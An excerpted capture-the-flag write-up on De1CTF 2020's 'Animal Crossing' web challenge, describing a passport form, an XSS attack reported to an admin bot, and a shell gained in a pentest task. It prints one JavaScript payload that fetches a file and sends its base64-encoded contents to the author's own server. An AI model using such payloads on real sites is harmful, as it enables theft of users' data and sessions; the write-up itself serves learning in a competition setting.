---
title: "De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1"
...
De1CTF 2020 really gave me a thorough and in-depth understanding of php, maybe more than I would ever done on my own. It was a actually welcome experience to try out web problems that weren't just purely web-based.
...
But that's just part 1 of the problem: we've sucessfully opened a shell on the server, but the scope of my pwn abilities isn't much to really comprehend what's going on here.
...
The website allows you to make a passport. There are fields for your name, island name, and favourite fruit, I think. 

![report](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/DE1CTF01.png)
...
![report](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/DE1CTF02.png)
...
Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack. I crafted this payload to report to admin in hopes of getting an admin cookie: 
...
With this in mind, I crafted a payload that would take a screenshot of the admin's screen, then send that to me, basically (similar to my catweb writeup albeit with a slightly different function):

```
fetch(`/static/images/xxxxxxxxx.png`).then(resp=>resp.text()).then(flag=>fetch(url+(btoa(flag) || 'Nothing')));
```

I create this and report it to the admin. When the admin visits the URL with the javascript payload, it will take a screenshot of the admin's interface and sends it back to my server. I get the address and download it for the other half of the flag:
...
Wow! That was a trip. If anything, these challenges taught me that I should probably spend a bit more time broadening my skills if I want to complete problems that intersect with other topics :P
